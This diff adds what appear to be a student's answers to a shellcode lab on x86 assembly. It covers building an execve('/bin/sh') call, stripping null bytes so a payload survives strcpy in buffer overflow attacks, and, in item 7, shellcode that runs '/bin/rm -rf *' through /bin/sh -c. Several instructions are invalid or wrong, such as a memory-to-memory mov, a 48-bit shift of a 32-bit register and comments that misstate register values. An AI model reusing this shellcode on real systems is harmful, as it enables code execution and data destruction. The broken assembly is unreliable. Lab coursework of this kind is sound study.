@@ -1,0 +1,53 @@
+1. eax: 11 (execve), ebx: address of "/bin/sh", ecx: address of argv, edx: environment variables address
+2. push 0; push "dddd"; push "cccc"; push "bbbb"; push "aaaa"; mov ebx, esp;
+3. push 0; push 0x33333333; push 0x22222222; push 0x11111111; mov ecx, esp;
+4. You don't need intermediate variables to store the addresses. Also, code requires omagic to be turned on upon compilation, unless it is in data section.
+5. *, *, *, * = 7, 12, 16, 12. (1): To get address of /bin/sh. (2): null terminate the string "/bin/sh". (3): copy argv[0]. (4): argv[1] = 0. (5). set ecx to point to head of argv. (6): string constant for "/bin/sh". (7): placeholder of argv[0]. (8): placeholder for argv[1].
+6. ?, ?, ?, ? = 15, 0, 4, 0. The first one is for argv[0] (argv) and the second one is for argv[1] and thrid is for "/bin/sh\0". Use the offsets to get the numbers.
+7.
+  pop ebx
+  xor eax, eax ;set eax to 0
+
+  ;Set to "abcd/bin/rm  -rf *\0*"
+  mov [ebx+11], ' '
+  mov [ebx+12], ' '
+  mov [ebx+16], ' '
+  mov [ebx+18], al
+
+  ;set second argument
+  push eax
+  push "-c  "
+  mov [ebx+24], esp
+
+  ;Set third argument to "/bin/rm..."
+  mov [ebx+28], [ebx+4]
+  
+  ;set 4th argument to 0 (null-terminated)
+  mov [ebx+32], eax
+
+  ;change ebx to /bin//sh
+  push eax
+  push "//sh"
+  push "/bin"
+  mov ebx, esp
+
+  ;set ebx to first argument
+  mov [ebx+20], ebx
+
+8. Because it is often used in buffer overflow attacks. strcpy won't copy anything after a 0. This will interfere with the attack.
+9. Use xor eax, eax as a 0 instead of the literal 0. Use shl and shr to set part of a number to 0. Use just one byte and initialize it with xor to zero.
+10. For little endian: shl eax, 16; shr eax, 16;. For big endian: shr eax, 16; shl eax, 16; (first the right for big and first the left for little)
+11. 
+  mov eax, 0xAAAAAAAA
+  shl eax, 48
+  shr eax, 48
+  ; right now we have 0xAA000000
+
+  shl eax, 16
+  ; now we have 0x00AA0000
+
+  mov al, 0xBB
+  ; now we have 0x00AA00BB
+
+  shr al, 16
+  ;now we have 0xAA00BB00
